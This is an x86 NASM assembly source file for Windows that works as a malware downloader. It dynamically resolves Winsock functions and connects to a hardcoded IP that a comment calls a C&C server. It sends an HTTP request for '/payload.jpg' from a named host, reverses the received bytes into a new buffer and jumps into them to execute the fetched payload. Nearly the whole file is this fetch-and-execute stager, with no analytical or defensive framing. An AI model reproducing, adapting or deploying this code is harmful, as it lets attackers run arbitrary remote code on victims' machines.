;Le Socket
extern _exit ,_fopen,_fgetc,_fclose,_toupper, _malloc , _free, _strlen, _puts
extern _putchar, _system, _Sleep@4, _SendInput@12, _LoadLibraryA@4, _GetProcAddress@8

;import WSAStartup wsock32.dll

Section .data; initialized data
				 Wsa_data 		dd 00000000     ; for out data, we don't need to worry here.
				 Wsa_Version 	dd 0x202 	 ; Version 202
				 
				 
				 
				 WsockdllAddr 	dd 00000000
				 WSAStartupaddr dd 00000000
				 socketaddr 	dd 00000000
				 inet_addraddr 	dd 00000000
				 htonsaddr 		dd 00000000
				 connectaddr 	dd 00000000
				 sendaddr		dd 00000000
				 recvaddr		dd 00000000
				 
				 mallocptr		dd 00000000
				 jmallocptr		dd 00000000
				 
				 Socket 		dd 00000000
				 port_AF_INET   dd 0x50000002 ; 50 is 80 In Hex, 2 is the AF_INET family flag
				 IPAddressinHex dd 00000000
				 StrLength		dd 00000000
				 recvammount	dd 00000000
				 
				 

				 
				 
				 wsock32str 	db "wsock32.dll",0
				 WSAStartupstr 	db "WSAStartup",0
				 socketstr 		db "socket",0
				 inet_addrstr 	db "inet_addr",0
				 htonsstr 		db "htons",0
				 connectstr 	db "connect",0
				 sendstr 		db "send",0
				 recvstr		dd "recv",0
				 
				 printformat db "%s",0
				 
								
				 Ipaddrstr 		db "73.65.151.30",0 ; C&C server IP
				 GetString 		db "GET /payload.jpg HTTP/1.1",0x0d,0x0a,"Host: reverseuplink.com",0x0d,0x0a,"Connection: close",0x0d,0x0a,0x0d,0xa,00,00



Section .bss ; Reserved Memory
			
Section .text ; .code section/ All instructions go here; 


global _main

	jmp _main
	@GetFunctionAddress:
	push ebp
	mov  ebp,esp
	push eax
	push dword [WsockdllAddr]
	call _GetProcAddress@8 ; 
	add esp, 4
	mov esp,ebp
	pop ebp
	retn
	
	
	
_main: ; int main (){}
	
	@LoadDll:
	push dword wsock32str
	call _LoadLibraryA@4 ; Auto cleans up
	mov dword [WsockdllAddr], eax
	
	
	@GetAllFunctAddress:
	
	mov eax,WSAStartupstr
	call @GetFunctionAddress
	mov dword [WSAStartupaddr], eax
	
	mov eax,socketstr
	call @GetFunctionAddress
	mov [socketaddr], eax
	
	mov eax, inet_addrstr
	call @GetFunctionAddress
	mov [inet_addraddr], eax
	
	mov eax,htonsstr
	call @GetFunctionAddress
	mov [htonsaddr], eax
	
	
	mov eax,connectstr
	call @GetFunctionAddress
	mov [connectaddr], eax
	
	mov eax,sendstr
	call @GetFunctionAddress
	mov [sendaddr], eax
	
	mov eax, recvstr
	call @GetFunctionAddress
	mov [recvaddr],eax
	
	
	
	
	@Prepare_For_Start:
	push 25000		;I know... messed up! needs at least 440 bytes. Weird eh?
	call _malloc
	mov [mallocptr], eax
	
	
	
	@Start_For_Real:
	push dword [mallocptr]
	push dword [Wsa_Version]
	call dword [WSAStartupaddr]
	
	
	;; S = Socket(AF_INET, SOCK_STREAM, 0);
	push 0 ; 0 
	push 1 ; SockStream
	push 2 ; AF_INET
	call dword [socketaddr]  
	mov [Socket], eax ; Save our Socket ; Hex to IP address
	
	
	push Ipaddrstr
	call dword [inet_addraddr]
	mov dword [IPAddressinHex], eax ; Save the Hexed IPaddr
	
	
	;Configuring htons
	push 80 ; port number
	call dword [htonsaddr]
	
	
	;Connect() ; recv value?
	push dword [IPAddressinHex] ;IPaddress in HEX
	push  dword [port_AF_INET]  ;Port + AF_INET 
	push 16
	push esp
	add dword [esp],4 ; 12 We do this so that it will point to our flags on the stack
	push dword [Socket]
	call dword [connectaddr]
	add esp, 12 ; Clean up!
	
	; Get the Url Complete Length
	push GetString
	call dword _strlen
	mov dword [StrLength], eax
	add esp, 4 ; Clean up!
	
	

	;Send(sendaddr,Socket,GetString,18,0);
	push 0
	push dword [StrLength]
	push dword GetString
	push dword [Socket]
	call dword [sendaddr]

	;recv()006C4140 ; We have the image and response at the proper loacation
	push 0
	push 25000 ; Bytes we want to recv
	push dword [mallocptr]
	nop
	nop
	push dword [Socket]
	call dword [recvaddr] ; EAX will have the ammount recvd
	
	
	; ; Calculate the next section of execution
	mov ecx , dword [mallocptr] ; Mov the memory pointer to ECX for accessing.
	add eax, ecx ; Get the end of the payload 
	dec eax ; Because the file actually ends in a 0x00 and we don't want to jmp there. We need jmp on the 2nd to last byte here.
	mov dword [recvammount], eax ; save the recv ammount ; We will need to move this to another tap in memory

	
	push 25000
	call _malloc
	mov dword [jmallocptr] , eax 
	
	mov esi, dword [recvammount]
	mov edi, dword [jmallocptr]
	mov ecx,2500 ; set the counter.
	
	@mov_bytes_to_jmallocptr:
	;MOVS BYTE ES:[EDI], PTR DS:[ESI]
	movsb

	dec esi
	dec esi
	dec ecx,
	jz @finish
	jmp @mov_bytes_to_jmallocptr
	
	
	@finish:
	mov eax , [jmallocptr]
	jmp eax
	
  ; Code executation never actually makes it hear due to the payload.
  
	@Exit:

	mov esp,ebp
	pop ebp
	push 0
	call _exit
;	ret	
	
